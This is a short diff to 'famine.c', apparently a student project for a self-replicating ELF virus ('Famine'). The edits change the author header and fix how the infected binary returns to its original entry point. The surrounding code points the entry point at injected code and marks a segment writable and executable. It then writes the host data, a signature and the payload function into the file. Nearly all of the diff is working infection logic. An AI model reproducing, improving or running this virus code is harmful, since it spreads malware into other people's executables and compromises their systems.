@@ -3,10 +3,10 @@
 /*                                                        :::      ::::::::   */
 /*   famine.c                                           :+:      :+:    :+:   */
 /*                                                    +:+ +:+         +:+     */
-/*   By: naminei <naminei@student.42.fr>            +#+  +:+       +#+        */
+/*   By: gbourgeo <gbourgeo@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/05/22 21:17:01 by root              #+#    #+#             */
-/*   Updated: 2019/08/23 14:22:57 by naminei          ###   ########.fr       */
+/*   Updated: 2019/08/24 20:26:06 by gbourgeo         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -274,7 +274,7 @@ void		pack_dat_elf(char *path, int size, char *data)
 		/* Where we write our code */
 	Elf64_Addr off = iprogram->p_offset + iprogram->p_filesz;
 		/* old entry point offset */
-	Elf64_Addr old_entry = (off - ((Elf64_Ehdr *)data)->e_entry) * (-1);
+	Elf64_Addr old_entry = (off - ((Elf64_Ehdr *)data)->e_entry - sizeof(famine64_signature)) * (-1);
 
 	/* 7. Change Elf Header entry point */
 	((Elf64_Ehdr *)data)->e_entry = off + sizeof(famine64_signature); // New entry point
@@ -319,9 +319,9 @@ printf(" famine64_size: %#lx", famine64_size);
 		iprogram->p_filesz += padding;
 		iprogram->p_memsz += padding;
 		iprogram->p_flags = PF_R | PF_W | PF_X;
-	// #ifdef FAMINE_DEBUGGABLE_EXECUTABLE_OUT
+		#ifdef FAMINE_DEBUGGABLE_EXECUTABLE_OUT
 		isection->sh_size += padding;
-	// #endif
+		#endif
 		syscall(WRITE, fd, data, off);
 		syscall(WRITE, fd, &famine64_signature, sizeof(famine64_signature));
 		syscall(WRITE, fd, &famine64_func, famine64_size - sizeof(old_entry));
